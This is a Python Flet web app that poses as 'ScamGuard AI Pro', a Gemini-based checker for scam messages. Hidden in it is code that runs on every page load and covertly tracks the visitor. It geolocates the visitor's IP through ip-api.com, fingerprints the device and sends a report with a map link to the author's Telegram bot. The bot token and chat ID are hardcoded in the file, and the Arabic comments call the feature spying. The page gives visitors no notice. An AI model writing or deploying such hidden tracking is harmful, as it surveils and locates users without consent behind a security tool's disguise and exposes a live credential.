import flet as ft
import google.generativeai as genai
import os
import urllib.request
import urllib.parse
import json
import threading
import hashlib

# 🔑 إعداد Gemini API
API_KEY = os.getenv("GEMINI_API_KEY")
genai.configure(api_key=API_KEY)
model = genai.GenerativeModel("gemini-1.5-flash")

# 🕵️‍♂️ دالة التتبع المتقدمة (الرادار الرقمي)
def send_advanced_report(ip, ua, platform, lang, width, height):
    try:
        if not ip or ip in ["127.0.0.1", "0.0.0.0"]: return
        
        # 1. جلب معلومات الموقع الجغرافي العميقة
        res = urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=5)
        data = json.loads(res.read().decode())
        
        # 2. استخراج اسم الهاتف (Phone Model) من الـ User-Agent
        device_model = "Unknown Device"
        try:
            if "(" in ua:
                parts = ua.split("(")[1].split(")")[0].split(";")
                device_model = parts[2] if len(parts) > 2 else parts[0]
        except: pass

        # 3. توليد بصمة فريدة للجهاز (Fingerprint) لتعرفه حتى لو غير الـ IP
        fingerprint = hashlib.md5(f"{ua}{platform}{lang}".encode()).hexdigest()[:10].upper()

        # 4. صياغة التقرير الاستخباراتي
        report = (
            f"🕵️‍♂️ **تنبيه أمني: اختراق زائر جديد**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🆔 **بصمة الجهاز:** `{fingerprint}`\n"
            f"📱 **نوع الهاتف:** `{device_model.strip()}`\n"
            f"💻 **النظام:** {platform}\n"
            f"🌍 **اللغة:** {lang}\n"
            f"🖥️ **الشاشة:** {width}x{height}\n"
            f"━━━━━━━━━━━━━━\n"
            f"📍 **الموقع:** {data.get('country')} - {data.get('city')}\n"
            f"⏰ **التوقيت:** {data.get('timezone')}\n"
            f"📡 **الشبكة:** {data.get('isp')}\n"
            f"🌐 **IP:** `{ip}`\n"
            f"🗺️ **الخريطة:** [اضغط هنا](https://www.google.com/maps?q={data.get('lat')},{data.get('lon')})\n"
            f"━━━━━━━━━━━━━━"
        )
        
        TOKEN = "8224848160:AAHwuyB1-asKYVfPOtfvlkSgQRDUz35e8d8"
        CHAT_ID = "6178338980"
        
        safe_msg = urllib.parse.quote(report)
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={safe_msg}&parse_mode=Markdown&disable_web_page_preview=true"
        urllib.request.urlopen(url, timeout=5)
    except:
        pass

def main(page: ft.Page):
    # 🎯 جلب المعلومات المتاحة يقيناً عند الاتصال
    def capture_and_spy():
        ip = page.client_ip
        ua = page.client_user_agent if page.client_user_agent else "Unknown"
        plat = page.platform if page.platform else "Unknown"
        lang = page.browser_language if page.browser_language else "Unknown"
        w = page.window_width
        h = page.window_height
        
        threading.Thread(target=send_advanced_report, args=(ip, ua, plat, lang, w, h), daemon=True).start()

    # تشغيل نظام التجسس فوراً
    capture_and_spy()

    page.title = "ScamGuard AI Pro - By Amine"
    page.theme_mode = ft.ThemeMode.DARK
    page.rtl = True
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.scroll = "auto"
    page.padding = 25

    def check_scam(e):
        if not input_box.value.strip():
            res_txt.value = "⚠️ الرجاء إدخال نص للفحص أولاً"; page.update(); return
        
        btn.disabled = True; loading_row.visible = True; res_card.visible = False; page.update()
        
        try:
            prompt = f"حلل هذا النص كخبير احتيال رقمي بلهجة عربية واضحة:\n{input_box.value}"
            response = model.generate_content(prompt)
            res_txt.value = response.text if response.text else "⚠️ فشل في الحصول على تحليل."
        except Exception as err:
            res_txt.value = f"❌ خطأ تقني: {str(err)}"
        
        loading_row.visible = False; btn.disabled = False; res_card.visible = True; page.update()

    # الواجهة (🛡️ النسخة المستقرة)
    logo = ft.Text("🛡️", size=80)
    title = ft.Text("ScamGuard AI Pro", size=32, weight="bold", color="blue400")
    input_box = ft.TextField(label="📩 الصق نص الرسالة هنا للفحص", multiline=True, min_lines=4, border_radius=15, width=400)
    btn = ft.ElevatedButton("🚀 بدء الفحص الذكي", on_click=check_scam, height=50, width=220)
    loading_row = ft.Row([ft.ProgressRing(width=20), ft.Text("جاري التحليل...")], visible=False, alignment="center")
    res_txt = ft.Text(size=16, selectable=True)
    res_card = ft.Card(visible=False, content=ft.Container(padding=20, content=ft.Column([ft.Text("📊 تقرير الأمان", color="cyan", weight="bold"), res_txt])), width=450)
    
    page.add(logo, title, input_box, btn, loading_row, res_card)

if __name__ == "__main__":
    ft.app(target=main, view=None, port=int(os.getenv("PORT", 8080)), host="0.0.0.0")
    
